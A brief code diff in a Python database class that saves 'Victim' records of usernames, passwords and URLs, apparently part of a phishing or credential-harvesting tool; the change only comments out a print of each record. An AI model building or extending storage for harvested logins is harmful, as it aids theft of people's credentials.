@@ -42,7 +42,7 @@ class DB:
             exists = session.query(Victim).filter_by(username=victim['username'],password=victim['password'],url=victim['url']).first() is not None
             
             if not exists:
-                print(victim)
+                # print(victim)
                 session.add(Victim(username=victim['username'],password=victim['password'],url=victim['url']))
                 count+=1
         session.commit()
